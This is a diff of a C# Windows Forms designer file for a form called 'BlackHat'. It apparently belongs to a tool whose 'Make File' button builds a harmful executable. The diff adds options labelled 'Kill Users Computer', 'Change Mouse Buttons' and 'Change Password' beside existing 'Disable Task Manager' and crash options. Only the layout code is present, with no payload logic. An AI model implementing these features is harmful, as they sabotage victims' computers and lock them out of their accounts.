@@ -52,7 +52,7 @@
             this.label7 = new System.Windows.Forms.Label();
             this.panel4 = new System.Windows.Forms.Panel();
             this.CrashCheck = new System.Windows.Forms.CheckBox();
-            this.checkBox1 = new System.Windows.Forms.CheckBox();
+            this.KillComputerCheck = new System.Windows.Forms.CheckBox();
             this.panel5 = new System.Windows.Forms.Panel();
             this.panel6 = new System.Windows.Forms.Panel();
             this.panel7 = new System.Windows.Forms.Panel();
@@ -63,11 +63,13 @@
             this.MessageCheck = new System.Windows.Forms.CheckBox();
             this.button2 = new System.Windows.Forms.Button();
             this.DisableTaskCheck = new System.Windows.Forms.CheckBox();
-            this.checkBox2 = new System.Windows.Forms.CheckBox();
+            this.CrazyMouseCheck = new System.Windows.Forms.CheckBox();
             this.panel10 = new System.Windows.Forms.Panel();
             this.label9 = new System.Windows.Forms.Label();
-            this.textBox1 = new System.Windows.Forms.TextBox();
-            this.checkBox3 = new System.Windows.Forms.CheckBox();
+            this.PasswordText = new System.Windows.Forms.TextBox();
+            this.PasswordCheck = new System.Windows.Forms.CheckBox();
+            this.button3 = new System.Windows.Forms.Button();
+            this.checkBox1 = new System.Windows.Forms.CheckBox();
             this.SuspendLayout();
             // 
             // panel1
@@ -135,9 +137,9 @@
             // 
             this.button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
             this.button1.ForeColor = System.Drawing.Color.White;
-            this.button1.Location = new System.Drawing.Point(196, 426);
+            this.button1.Location = new System.Drawing.Point(196, 439);
             this.button1.Name = "button1";
-            this.button1.Size = new System.Drawing.Size(77, 27);
+            this.button1.Size = new System.Drawing.Size(160, 27);
             this.button1.TabIndex = 6;
             this.button1.Text = "Make File";
             this.button1.UseVisualStyleBackColor = true;
@@ -276,7 +278,7 @@
             // panel3
             // 
             this.panel3.BackColor = System.Drawing.Color.White;
-            this.panel3.Location = new System.Drawing.Point(180, 405);
+            this.panel3.Location = new System.Drawing.Point(178, 399);
             this.panel3.Name = "panel3";
             this.panel3.Size = new System.Drawing.Size(191, 5);
             this.panel3.TabIndex = 19;
@@ -313,17 +315,18 @@
             this.CrashCheck.UseVisualStyleBackColor = true;
             this.CrashCheck.CheckedChanged += new System.EventHandler(this.checkBox1_CheckedChanged);
             // 
-            // checkBox1
+            // KillComputerCheck
             // 
-            this.checkBox1.AutoSize = true;
-            this.checkBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
-            this.checkBox1.ForeColor = System.Drawing.Color.White;
-            this.checkBox1.Location = new System.Drawing.Point(205, 247);
-            this.checkBox1.Name = "checkBox1";
-            this.checkBox1.Size = new System.Drawing.Size(99, 19);
-            this.checkBox1.TabIndex = 23;
-            this.checkBox1.Text = "Coming soon";
-            this.checkBox1.UseVisualStyleBackColor = true;
+            this.KillComputerCheck.AutoSize = true;
+            this.KillComputerCheck.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.KillComputerCheck.ForeColor = System.Drawing.Color.White;
+            this.KillComputerCheck.Location = new System.Drawing.Point(205, 247);
+            this.KillComputerCheck.Name = "KillComputerCheck";
+            this.KillComputerCheck.Size = new System.Drawing.Size(135, 19);
+            this.KillComputerCheck.TabIndex = 23;
+            this.KillComputerCheck.Text = "Kill Users Computer";
+            this.KillComputerCheck.UseVisualStyleBackColor = true;
+            this.KillComputerCheck.CheckedChanged += new System.EventHandler(this.KillComputerCheck_CheckedChanged);
             // 
             // panel5
             // 
@@ -401,7 +404,7 @@
             // 
             this.button2.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
             this.button2.ForeColor = System.Drawing.Color.White;
-            this.button2.Location = new System.Drawing.Point(279, 426);
+            this.button2.Location = new System.Drawing.Point(196, 406);
             this.button2.Name = "button2";
             this.button2.Size = new System.Drawing.Size(77, 27);
             this.button2.TabIndex = 30;
@@ -421,17 +424,17 @@
             this.DisableTaskCheck.Text = "Disable Task Manager";
             this.DisableTaskCheck.UseVisualStyleBackColor = true;
             // 
-            // checkBox2
+            // CrazyMouseCheck
             // 
-            this.checkBox2.AutoSize = true;
-            this.checkBox2.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
-            this.checkBox2.ForeColor = System.Drawing.Color.White;
-            this.checkBox2.Location = new System.Drawing.Point(205, 272);
-            this.checkBox2.Name = "checkBox2";
-            this.checkBox2.Size = new System.Drawing.Size(99, 19);
-            this.checkBox2.TabIndex = 32;
-            this.checkBox2.Text = "Coming soon";
-            this.checkBox2.UseVisualStyleBackColor = true;
+            this.CrazyMouseCheck.AutoSize = true;
+            this.CrazyMouseCheck.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.CrazyMouseCheck.ForeColor = System.Drawing.Color.White;
+            this.CrazyMouseCheck.Location = new System.Drawing.Point(205, 272);
+            this.CrazyMouseCheck.Name = "CrazyMouseCheck";
+            this.CrazyMouseCheck.Size = new System.Drawing.Size(154, 19);
+            this.CrazyMouseCheck.TabIndex = 32;
+            this.CrazyMouseCheck.Text = "Change Mouse Buttons";
+            this.CrazyMouseCheck.UseVisualStyleBackColor = true;
             // 
             // panel10
             // 
@@ -448,31 +451,55 @@
             this.label9.ForeColor = System.Drawing.Color.White;
             this.label9.Location = new System.Drawing.Point(9, 403);
             this.label9.Name = "label9";
-            this.label9.Size = new System.Drawing.Size(40, 15);
+            this.label9.Size = new System.Drawing.Size(64, 15);
             this.label9.TabIndex = 35;
-            this.label9.Text = "BETA:";
+            this.label9.Text = "Password:";
             // 
-            // textBox1
+            // PasswordText
             // 
-            this.textBox1.BackColor = System.Drawing.Color.Black;
-            this.textBox1.ForeColor = System.Drawing.Color.White;
-            this.textBox1.Location = new System.Drawing.Point(77, 398);
-            this.textBox1.Name = "textBox1";
-            this.textBox1.Size = new System.Drawing.Size(86, 20);
-            this.textBox1.TabIndex = 34;
-            this.textBox1.TextChanged += new System.EventHandler(this.textBox1_TextChanged);
+            this.PasswordText.BackColor = System.Drawing.Color.Black;
+            this.PasswordText.ForeColor = System.Drawing.Color.White;
+            this.PasswordText.Location = new System.Drawing.Point(77, 398);
+            this.PasswordText.Name = "PasswordText";
+            this.PasswordText.Size = new System.Drawing.Size(86, 20);
+            this.PasswordText.TabIndex = 34;
+            this.PasswordText.TextChanged += new System.EventHandler(this.textBox1_TextChanged);
             // 
-            // checkBox3
+            // PasswordCheck
             // 
-            this.checkBox3.AutoSize = true;
-            this.checkBox3.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
-            this.checkBox3.ForeColor = System.Drawing.Color.White;
-            this.checkBox3.Location = new System.Drawing.Point(12, 373);
-            this.checkBox3.Name = "checkBox3";
-            this.checkBox3.Size = new System.Drawing.Size(101, 19);
-            this.checkBox3.TabIndex = 33;
-            this.checkBox3.Text = "Coming Soon";
-            this.checkBox3.UseVisualStyleBackColor = true;
+            this.PasswordCheck.AutoSize = true;
+            this.PasswordCheck.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.PasswordCheck.ForeColor = System.Drawing.Color.White;
+            this.PasswordCheck.Location = new System.Drawing.Point(12, 373);
+            this.PasswordCheck.Name = "PasswordCheck";
+            this.PasswordCheck.Size = new System.Drawing.Size(126, 19);
+            this.PasswordCheck.TabIndex = 33;
+            this.PasswordCheck.Text = "Change Password";
+            this.PasswordCheck.UseVisualStyleBackColor = true;
+            // 
+            // button3
+            // 
+            this.button3.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.button3.ForeColor = System.Drawing.Color.White;
+            this.button3.Location = new System.Drawing.Point(279, 406);
+            this.button3.Name = "button3";
+            this.button3.Size = new System.Drawing.Size(77, 27);
+            this.button3.TabIndex = 37;
+            this.button3.Text = "About";
+            this.button3.UseVisualStyleBackColor = true;
+            this.button3.Click += new System.EventHandler(this.button3_Click);
+            // 
+            // checkBox1
+            // 
+            this.checkBox1.AutoSize = true;
+            this.checkBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.checkBox1.ForeColor = System.Drawing.Color.White;
+            this.checkBox1.Location = new System.Drawing.Point(205, 297);
+            this.checkBox1.Name = "checkBox1";
+            this.checkBox1.Size = new System.Drawing.Size(99, 19);
+            this.checkBox1.TabIndex = 38;
+            this.checkBox1.Text = "Coming soon";
+            this.checkBox1.UseVisualStyleBackColor = true;
             // 
             // BlackHat
             // 
@@ -480,11 +507,13 @@
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
             this.BackColor = System.Drawing.Color.Black;
             this.ClientSize = new System.Drawing.Size(368, 491);
+            this.Controls.Add(this.checkBox1);
+            this.Controls.Add(this.button3);
             this.Controls.Add(this.panel10);
             this.Controls.Add(this.label9);
-            this.Controls.Add(this.textBox1);
-            this.Controls.Add(this.checkBox3);
-            this.Controls.Add(this.checkBox2);
+            this.Controls.Add(this.PasswordText);
+            this.Controls.Add(this.PasswordCheck);
+            this.Controls.Add(this.CrazyMouseCheck);
             this.Controls.Add(this.DisableTaskCheck);
             this.Controls.Add(this.button2);
             this.Controls.Add(this.panel9);
@@ -496,7 +525,7 @@
             this.Controls.Add(this.panel6);
             this.Controls.Add(this.panel5);
             this.Controls.Add(this.panel1);
-            this.Controls.Add(this.checkBox1);
+            this.Controls.Add(this.KillComputerCheck);
             this.Controls.Add(this.CrashCheck);
             this.Controls.Add(this.panel4);
             this.Controls.Add(this.label7);
@@ -555,7 +584,7 @@
         private System.Windows.Forms.Label label7;
         private System.Windows.Forms.Panel panel4;
         private System.Windows.Forms.CheckBox CrashCheck;
-        private System.Windows.Forms.CheckBox checkBox1;
+        private System.Windows.Forms.CheckBox KillComputerCheck;
         private System.Windows.Forms.Panel panel5;
         private System.Windows.Forms.Panel panel6;
         private System.Windows.Forms.Panel panel7;
@@ -566,11 +595,13 @@
         private System.Windows.Forms.CheckBox MessageCheck;
         private System.Windows.Forms.Button button2;
         private System.Windows.Forms.CheckBox DisableTaskCheck;
-        private System.Windows.Forms.CheckBox checkBox2;
+        private System.Windows.Forms.CheckBox CrazyMouseCheck;
         private System.Windows.Forms.Panel panel10;
         private System.Windows.Forms.Label label9;
-        private System.Windows.Forms.TextBox textBox1;
-        private System.Windows.Forms.CheckBox checkBox3;
+        private System.Windows.Forms.TextBox PasswordText;
+        private System.Windows.Forms.CheckBox PasswordCheck;
+        private System.Windows.Forms.Button button3;
+        private System.Windows.Forms.CheckBox checkBox1;
     }
 }
 
